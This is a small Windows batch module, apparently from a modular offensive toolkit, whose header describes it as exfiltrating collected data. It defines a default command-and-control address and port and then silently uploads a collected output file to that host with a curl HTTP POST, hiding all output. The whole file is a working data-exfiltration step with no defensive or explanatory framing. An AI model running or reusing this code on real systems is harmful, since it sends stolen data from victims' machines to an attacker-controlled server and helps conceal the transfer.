REM provides: exfil_curl
REM depends: core/output
REM description: Exfiltrate collected data via curl HTTP POST

if not defined C2_IP set "C2_IP=10.0.2.2"
if not defined C2_PORT set "C2_PORT=9001"

curl -s -X POST -H "Content-Type: application/octet-stream" --data-binary @"%OUTPUT_FILE%" "http://%C2_IP%:%C2_PORT%/upload" >nul 2>nul
